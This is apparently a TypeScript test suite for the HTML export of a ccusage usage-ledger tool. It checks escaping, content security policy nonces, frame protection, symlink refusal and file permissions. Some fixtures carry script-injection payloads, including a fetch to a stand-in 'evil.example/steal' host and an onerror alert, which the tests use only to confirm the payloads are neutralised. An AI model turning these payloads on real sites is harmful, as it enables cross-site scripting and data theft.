import { describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, statSync, chmodSync, writeFileSync, readFileSync, readdirSync, symlinkSync, lstatSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import type { UsageData } from "./types";
import { buildExportedHtml, exportOutputPath, writeExportedHtml, isForeignGitWorktree, exportForeignWorktreePolicy } from "./export";

const HTML = [
  "<!doctype html><html><head><title>ccusage</title>",
  '<link rel="stylesheet" href="/public/app.css" />',
  "</head><body>",
  '<script src="/public/vendor/chart.umd.min.js"></script>',
  '<script id="embedded-data"></script>',
  '<script src="/dist/bundle.js"></script>',
  "</body></html>",
].join("\n");

const DATA: UsageData = {
  daily: [
    {
      period: "2026-08-11",
      totalCost: 1.5,
      totalTokens: 100,
      inputTokens: 60,
      outputTokens: 40,
      cacheReadTokens: 0,
      cacheCreationTokens: 0,
      modelsUsed: ["claude"],
      modelBreakdowns: [],
      agents: [],
    },
  ],
  monthly: [],
};

function build(): string {
  return buildExportedHtml(HTML, "var CHART = 1;", "var BUNDLE = 2;", "body { color: #000; }", DATA);
}

describe("buildExportedHtml の置換は $ 特殊パターンを解釈しない", () => {
  // String.prototype.replace は置換文字列内の $$ / $& / $` / $' / $1 を特殊パターンとして
  // 解釈するため、埋め込む JS・CSS・データが黙って書き換わる。実際に bundle 内の
  // `$${cost.toFixed(2)}` が `${cost.toFixed(2)}` になり、エクスポート HTML の
  // 全金額から通貨記号が消えていた
  const DOLLARS = "const price = `$${cost.toFixed(2)}`; const m = '$&' + '$`' + \"$'\" + '$1';";

  test("バンドルの $ 記号がそのまま保持される（金額の通貨記号が消えない）", () => {
    const out = buildExportedHtml(HTML, "var CHART = 1;", DOLLARS, "body { color: #000; }", DATA);
    expect(out).toContain(DOLLARS);
  });

  test("Chart.js・CSS の $ 記号もそのまま保持される", () => {
    const css = "body { content: '$$ $& $1'; }";
    const out = buildExportedHtml(HTML, DOLLARS, "var BUNDLE = 2;", css, DATA);
    expect(out).toContain(DOLLARS);
    expect(out).toContain(css);
  });

  test("埋め込みデータ内の $ 記号（モデル名など外部データ由来）が壊れない", () => {
    const data = {
      ...DATA,
      daily: [{ ...DATA.daily![0]!, modelsUsed: ["model-$$-$&-$'"] }],
    };
    const out = buildExportedHtml(HTML, "var CHART = 1;", "var BUNDLE = 2;", "body{}", data);
    const embedded = embeddedScriptContent(out);
    expect(JSON.parse(embedded.replace("window.CCUSAGE_DATA = ", "").replace(/;$/, "")).daily[0].modelsUsed)
      .toEqual(["model-$$-$&-$'"]);
  });
});

function embeddedScriptContent(out: string): string {
  const match = out.match(/<script id="embedded-data"[^>]*>(.*?)<\/script>/s);
  expect(match).not.toBeNull();
  return match![1]!;
}

function extractEmbeddedJson(out: string): string {
  const assignment = embeddedScriptContent(out);
  expect(assignment).toMatch(/^window\.CCUSAGE_DATA = /);
  return assignment.replace(/^window\.CCUSAGE_DATA = /, "").replace(/;$/, "");
}

describe("exportOutputPath", () => {
  test("出力先は実行時カレントの dist/ccusage-ledger.html", () => {
    expect(exportOutputPath("/tmp/work")).toBe(join("/tmp/work", "dist", "ccusage-ledger.html"));
  });
});

describe("isForeignGitWorktree", () => {
  test("git リポジトリの外なら false（警告なし）", () => {
    const dir = mkdtempSync(join(tmpdir(), "ccusage-export-"));
    try {
      // 出力先とパッケージルートが同じ（git 外 or 同一ルートに属する）場合は false
      expect(isForeignGitWorktree(dir, dir)).toBe(false);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("対象パッケージ自身の git リポジトリ内なら false（本来の利用）", () => {
    const dir = mkdtempSync(join(tmpdir(), "ccusage-export-"));
    try {
      mkdirSync(join(dir, ".git"));
      // 出力先（dir/dist）とパッケージルート（dir）が同じ git ルート
      expect(isForeignGitWorktree(dir, dir)).toBe(false);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("他プロジェクトの git リポジトリ内への書き込みは true（F8: 誤共有の防止）", () => {
    const dir = mkdtempSync(join(tmpdir(), "ccusage-export-"));
    try {
      const foreignRepo = join(dir, "other-project");
      const pkgRoot = join(dir, "ccusage-ledger");
      mkdirSync(join(foreignRepo, ".git"), { recursive: true });
      mkdirSync(join(pkgRoot, ".git"), { recursive: true });
      // 出力先は foreignRepo 内、パッケージルートは ccusage-ledger。git ルートが異なるため警告対象
      expect(isForeignGitWorktree(foreignRepo, pkgRoot)).toBe(true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("exportForeignWorktreePolicy", () => {
  test("外部の git リポジトリ内への出力は env 無しでは refuse（誤コミット防止）", () => {
    const dir = mkdtempSync(join(tmpdir(), "ccusage-export-"));
    try {
      const foreignRepo = join(dir, "other-project");
      const pkgRoot = join(dir, "ccusage-ledger");
      mkdirSync(join(foreignRepo, ".git"), { recursive: true });
      mkdirSync(join(pkgRoot, ".git"), { recursive: true });
      // 警告だけで続行すると誤コミットが起き得るため、デフォルトでは書き込みを拒否する
      expect(exportForeignWorktreePolicy({}, foreignRepo, pkgRoot)).toBe("refuse");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("外部リポジトリでも明示オプトイン（CCUSAGE_LEDGER_EXPORT_ALLOW_FOREIGN=1）なら ok", () => {
    const dir = mkdtempSync(join(tmpdir(), "ccusage-export-"));
    try {
      const foreignRepo = join(dir, "other-project");
      const pkgRoot = join(dir, "ccusage-ledger");
      mkdirSync(join(foreignRepo, ".git"), { recursive: true });
      mkdirSync(join(pkgRoot, ".git"), { recursive: true });
      for (const value of ["1", "true"]) {
        expect(exportForeignWorktreePolicy({ CCUSAGE_LEDGER_EXPORT_ALLOW_FOREIGN: value }, foreignRepo, pkgRoot)).toBe("ok");
      }
      expect(exportForeignWorktreePolicy({ CCUSAGE_LEDGER_EXPORT_ALLOW_FOREIGN: "0" }, foreignRepo, pkgRoot)).toBe("refuse");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("外部リポジトリでない場合は env に関係なく ok", () => {
    const dir = mkdtempSync(join(tmpdir(), "ccusage-export-"));
    try {
      mkdirSync(join(dir, ".git"), { recursive: true });
      expect(exportForeignWorktreePolicy({}, dir, dir)).toBe("ok");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("writeExportedHtml", () => {
  test("置換に失敗しても既存ファイルを保持する", () => {
    const dir = mkdtempSync(join(tmpdir(), "ccusage-export-"));
    const out = join(dir, "dist", "ccusage-ledger.html");
    try {
      mkdirSync(dirname(out), { recursive: true });
      writeFileSync(out, "old");
      expect(() => writeExportedHtml(out, "new", {
        rename: () => { throw new Error("rename failed"); },
      })).toThrow("rename failed");
      expect(readFileSync(out, "utf-8")).toBe("old");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("短い書き込みを繰り返してHTML全体を保存する", () => {
    const dir = mkdtempSync(join(tmpdir(), "ccusage-export-"));
    const out = join(dir, "dist", "ccusage-ledger.html");
    try {
      let written = "";
      writeExportedHtml(out, "complete", {
        write: (_fd, data, offset, length) => {
          const bytes = typeof data === "string" ? Buffer.from(data) : data;
          const count = Math.min(2, length ?? bytes.byteLength);
          written += Buffer.from(bytes).subarray(offset ?? 0, (offset ?? 0) + count).toString();
          return count;
        },
      });
      expect(written).toBe("complete");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("既存のシンボリックリンクを拒否し、リンク先を変更しない", () => {
    const dir = mkdtempSync(join(tmpdir(), "ccusage-export-"));
    try {
      const out = join(dir, "dist", "ccusage-ledger.html");
      const target = join(dir, "keep.txt");
      mkdirSync(dirname(out), { recursive: true });
      writeFileSync(target, "unchanged");
      symlinkSync(target, out);

      expect(() => writeExportedHtml(out, "<html>attack</html>")).toThrow(/symbolic link/i);
      expect(readFileSync(target, "utf-8")).toBe("unchanged");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("リンク先が存在しないシンボリックリンクも拒否する", () => {
    const dir = mkdtempSync(join(tmpdir(), "ccusage-export-"));
    try {
      const out = join(dir, "dist", "ccusage-ledger.html");
      const missingTarget = join(dir, "missing.html");
      mkdirSync(dirname(out), { recursive: true });
      symlinkSync(missingTarget, out);

      expect(() => writeExportedHtml(out, "<html>new</html>")).toThrow(/symbolic link/i);
      expect(lstatSync(out).isSymbolicLink()).toBe(true);
      expect(existsSync(missingTarget)).toBe(false);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("出力ファイルのパーミッションを 0600 にする", () => {
    const dir = mkdtempSync(join(tmpdir(), "ccusage-export-"));
    const out = join(dir, "dist", "ccusage-ledger.html");
    writeExportedHtml(out, "<html>test</html>");
    const mode = statSync(out).mode & 0o777;
    expect(mode).toBe(0o600);
    rmSync(dir, { recursive: true, force: true });
  });

  test("既存ファイルが 0644 でも上書き時に 0600 へ戻す（mode は作成時のみ適用されるため）", () => {
    const dir = mkdtempSync(join(tmpdir(), "ccusage-export-"));
    const out = join(dir, "dist", "ccusage-ledger.html");
    mkdirSync(dirname(out), { recursive: true });
    writeFileSync(out, "<html>old</html>", { mode: 0o644 });
    chmodSync(out, 0o644);
    writeExportedHtml(out, "<html>new</html>");
    expect(statSync(out).mode & 0o777).toBe(0o600);
    expect(readFileSync(out, "utf-8")).toBe("<html>new</html>");
    rmSync(dir, { recursive: true, force: true });
  });

  test("書き込みに失敗した場合は一時ファイルを残さない", () => {
    const dir = mkdtempSync(join(tmpdir(), "ccusage-export-"));
    const out = join(dir, "dist", "ccusage-ledger.html");
    try {
      expect(() => writeExportedHtml(out, Symbol("invalid") as unknown as string)).toThrow();
      expect(readdirSync(dirname(out))).toEqual([]);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("buildExportedHtml", () => {
  test("Chart.js の script タグをインライン内容に置換する", () => {
    const out = build();
    expect(out).toContain("<script nonce=");
    expect(out).toContain(">var CHART = 1;</script>");
    expect(out).not.toContain('<script src="/public/vendor/chart.umd.min.js"></script>');
  });

  test("bundle の script タグをインライン内容に置換する", () => {
    const out = build();
    expect(out).toContain("<script nonce=");
    expect(out).toContain(">var BUNDLE = 2;</script>");
    expect(out).not.toContain('<script src="/dist/bundle.js"></script>');
  });

  test("app.css の link タグをインラインの <style> に置換する", () => {
    const out = build();
    expect(out).toContain("<style nonce=");
    expect(out).toContain(">body { color: #000; }</style>");
    expect(out).not.toContain('<link rel="stylesheet" href="/public/app.css" />');
  });

  test("データを window.CCUSAGE_DATA に JSON として埋め込む", () => {
    const out = build();
    const json = extractEmbeddedJson(out);
    expect(JSON.parse(json)).toEqual(DATA);
  });

  test("埋め込むデータは白リスト投影を通す（未知フィールドを配布しない）", () => {
    const data = {
      ...DATA,
      daily: [{ ...DATA.daily![0]!, promptText: "sensitive session text", unknownField: { nested: 1 } }],
    };
    const out = buildExportedHtml(HTML, "chart", "bundle", "css", data as unknown as typeof DATA);
    const embedded = JSON.parse(extractEmbeddedJson(out)) as Record<string, unknown>;
    const entry = (embedded.daily as Record<string, unknown>[])[0]!;
    expect(entry.promptText).toBeUndefined();
    expect(entry.unknownField).toBeUndefined();
  });

  test("データに </script> を含む文字列があっても script を破壊しない", () => {
    const data: UsageData = {
      ...DATA,
      daily: [
        {
          ...DATA.daily![0]!,
          modelsUsed: ['claude-3</script><script>alert("x")'],
        },
      ],
    };
    const out = buildExportedHtml(HTML, "chart", "bundle", "css", data);
    expect(embeddedScriptContent(out)).not.toContain("</script>");
    expect(JSON.parse(extractEmbeddedJson(out))).toEqual(data);
  });

  test("データに script 終了タグが複数あっても埋め込みにリテラルの < を残さない", () => {
    const data: UsageData = {
      ...DATA,
      daily: [
        {
          ...DATA.daily![0]!,
          modelBreakdowns: [
            {
              modelName: '</script><script>fetch("//evil/x")</script><img src=x onerror=alert(1)>',
              cost: 1,
              inputTokens: 1,
              outputTokens: 1,
              cacheReadTokens: 0,
              cacheCreationTokens: 0,
            },
          ],
        },
      ],
    };
    const out = buildExportedHtml(HTML, "chart", "bundle", "css", data);
    expect(embeddedScriptContent(out)).not.toContain("<");
    expect(JSON.parse(extractEmbeddedJson(out))).toEqual(data);
  });

  test("敵対的なデータでも、エクスポート HTML 全体に生の </script> ペイロードを含めない", () => {
    const payload = '</script><script>fetch("https://evil.example/steal")</script>';
    const data: UsageData = {
      ...DATA,
      daily: [
        {
          ...DATA.daily![0]!,
          modelBreakdowns: [
            {
              modelName: payload,
              cost: 1,
              inputTokens: 1,
              outputTokens: 1,
              cacheReadTokens: 0,
              cacheCreationTokens: 0,
            },
          ],
        },
      ],
    };
    const out = buildExportedHtml(HTML, "chart", "bundle", "css", data);
    // 生のペイロード断片が出力のどこにも現れない（エスケープ + \u003c 変換で実効化されない）
    expect(out).not.toContain(payload);
    // embedded-data スクリプト内にリテラルの < を残さない
    expect(embeddedScriptContent(out)).not.toContain("<");
  });

  test("データに U+2028 / U+2029 が含まれても埋め込みに生バイトを残さない（旧 JS エンジンで script が壊れない）", () => {
    const data: UsageData = {
      ...DATA,
      daily: [
        {
          ...DATA.daily![0]!,
          modelsUsed: ["claude\u2028-4", "gpt\u2029-5"],
        },
      ],
    };
    const out = buildExportedHtml(HTML, "chart", "bundle", "css", data);
    expect(embeddedScriptContent(out)).not.toContain("\u2028");
    expect(embeddedScriptContent(out)).not.toContain("\u2029");
    expect(JSON.parse(extractEmbeddedJson(out))).toEqual(data);
  });

  test("データに <!--（HTML コメント開始）が含まれてもエクスポート全体にリテラルを残さない", () => {
    // < を \u003c に変換するため <!-- も \u003c!-- になる。script 内のリテラルを
    // コメントとして終端させられないことを検証する（attack-review F17）
    const data: UsageData = {
      ...DATA,
      daily: [
        {
          ...DATA.daily![0]!,
          modelsUsed: ["claude<!--"],
        },
      ],
    };
    const out = buildExportedHtml(HTML, "chart", "bundle", "css", data);
    expect(out).not.toContain("<!--");
    expect(JSON.parse(extractEmbeddedJson(out))).toEqual(data);
  });

  test("エクスポート HTML に CSP を注入する（ネットワーク送信を遮断）", () => {
    const out = build();
    expect(out).toContain('<meta http-equiv="Content-Security-Policy"');
    expect(out).toContain("connect-src 'none'");
    expect(out).toContain("frame-ancestors 'none'");
  });

  test("CSP の script-src は nonce ベースで、script-src に unsafe-inline を含めない（F3: エスケープ漏れ時のバックストップ）", () => {
    // 単一ファイル HTML はインライン script を避けられないが、nonce 属性付きタグのみを許可し、
    // script-src から 'unsafe-inline' を除去する。これにより、将来のエスケープ回帰で注入された
    // <script> やインラインイベントハンドラ（onerror 等）は nonce を持たないためブロックされる
    const out = build();
    const csp = out.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/)![1]!;
    expect(csp).toMatch(/script-src 'nonce-[A-Za-z0-9+/=]+'/);
    // script-src ディレクティブ（style-src-attr ではない）に unsafe-inline が無いことを検証する
    const scriptSrc = csp.match(/script-src [^;]+/)![0]!;
    expect(scriptSrc).not.toContain("'unsafe-inline'");
  });

  test("インライン script すべてに CSP nonce 属性を付与する（埋め込みデータ / Chart.js / bundle / frame buster）", () => {
    const out = build();
    const csp = out.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/)![1]!;
    const nonce = csp.match(/script-src 'nonce-([A-Za-z0-9+/=]+)'/)![1]!;
    // 全ての <script ...> タグ（非 src 属性）に nonce 属性が付く
    const scripts = [...out.matchAll(/<script(?![^>]*\bsrc=)[^>]*>/g)].map((m) => m[0]);
    expect(scripts.length).toBeGreaterThanOrEqual(4);
    for (const tag of scripts) {
      expect(tag).toContain(`nonce="${nonce}"`);
    }
    // src 属性を持つ script タグ（サーバー配信用タグ）は export 内に残らない
    expect(out).not.toContain('<script src=');
  });

  test("style 要素（インライン CSS）にも nonce を付与し、style-src-attr のみ unsafe-inline を許す", () => {
    const out = build();
    const csp = out.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/)![1]!;
    // bar 幅（style="width:N%"）や警告バナーのインライン style 属性のため style-src-attr のみ許可
    expect(csp).toContain("style-src-attr 'unsafe-inline'");
    expect(csp).toMatch(/style-src 'nonce-[A-Za-z0-9+/=]+'/);
    // <style> 要素にも nonce が付与される
    expect(out).toMatch(/<style nonce="/);
  });

  test("データに </script> を含む文字列があっても script を破壊しない", () => {
    const data: UsageData = {
      ...DATA,
      daily: [
        {
          ...DATA.daily![0]!,
          modelsUsed: ['claude-3</script><script>alert("x")'],
        },
      ],
    };
    const out = buildExportedHtml(HTML, "chart", "bundle", "css", data);
    expect(embeddedScriptContent(out)).not.toContain("</script>");
    expect(JSON.parse(extractEmbeddedJson(out))).toEqual(data);
  });

  test("エクスポート HTML にデータ取り扱いの警告バナーを注入する（英語デフォルト + data-i18n キー）", () => {
    const out = build();
    expect(out).toContain("This file contains your ccusage usage data");
    expect(out).toContain('data-i18n="exportWarning"');
  });

  test("エクスポート HTML にフレーム検出スクリプトを注入する（clickjacking 対策）", () => {
    const out = build();
    expect(out).toContain("window.top === window.self");
  });

  test("フレーム保護は fail-closed（既定で非表示、トップレベルのときだけ表示）", () => {
    // sandbox 付き iframe やクロスオリジンのトップナビゲーション制限下では
    // window.top.location への代入が例外・無視になるため、脱出だけに頼ると
    // フレーム内に個人データが表示されたままになる
    const out = build();
    expect(out).toContain("html{display:none}");
    // トップレベルだと確認できたときだけ表示に戻す
    expect(out).toMatch(/window\.top === window\.self[\s\S]*documentElement\.style\.display/);
    // 脱出できない場合に例外で処理が止まらず、非表示のまま維持されること
    expect(out).toMatch(/try \{ window\.top\.location[\s\S]*catch/);
    // JS 無効時は script が動かないため、noscript で表示に戻す（警告は別途出す）
    expect(out).toMatch(/<noscript><style[^>]*>html\{display:block\}<\/style><\/noscript>/);
  });

  test("JS 無効環境向けに <noscript> フレーム保護警告を注入する（F14）", () => {
    // frame buster は JS 依存のため、JS を無効化した環境では iframe 埋め込みを防げない。
    // その旨をユーザーに明示する noscript ブロックを注入する
    const out = build();
    expect(out).toContain("<noscript");
    expect(out).toMatch(/<noscript[^>]*>[\s\S]*<\/noscript>/);
    expect(out).toMatch(/frame|iframe|embed/i);
  });

  test("</head> が無い HTML では例外を投げる（CSP 注入が静かに失われない）", () => {
    expect(() => buildExportedHtml("<html><body></body></html>", "chart", "bundle", "css", DATA)).toThrow();
  });

  test("<body> が無い HTML では例外を投げる（バナー注入が静かに失われない）", () => {
    expect(() => buildExportedHtml("<html><head></head></html>", "chart", "bundle", "css", DATA)).toThrow();
  });

  test("Chart.js / bundle / 埋め込みデータ / app.css のタグが無い HTML では例外を投げる（replace 漏れを検出）", () => {
    const withoutChart = HTML.replace('<script src="/public/vendor/chart.umd.min.js"></script>', "");
    expect(() => buildExportedHtml(withoutChart, "chart", "bundle", "css", DATA)).toThrow(/chart/i);

    const withoutBundle = HTML.replace('<script src="/dist/bundle.js"></script>', "");
    expect(() => buildExportedHtml(withoutBundle, "chart", "bundle", "css", DATA)).toThrow(/bundle/i);

    const withoutEmbedded = HTML.replace('<script id="embedded-data"></script>', "");
    expect(() => buildExportedHtml(withoutEmbedded, "chart", "bundle", "css", DATA)).toThrow(/embedded data/i);

    const withoutCss = HTML.replace('<link rel="stylesheet" href="/public/app.css" />', "");
    expect(() => buildExportedHtml(withoutCss, "chart", "bundle", "css", DATA)).toThrow(/app\.css/i);
  });
});
